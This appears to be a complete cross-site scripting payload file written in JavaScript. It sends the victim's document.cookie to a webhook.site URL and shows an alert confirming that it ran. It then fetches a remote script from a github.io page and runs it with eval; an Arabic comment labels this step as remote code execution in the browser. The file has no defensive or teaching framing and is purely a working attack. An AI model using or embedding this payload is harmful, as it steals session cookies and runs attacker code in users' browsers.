fetch("https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?cookie=" + document.cookie);
alert("XSS Executed from external JS!");

// تحميل كود خارجي لتنفيذ RCE داخل المتصفح
fetch("https://saif7829.github.io/rce/rce.js")
  .then(res => res.text())
  .then(code => eval(code));
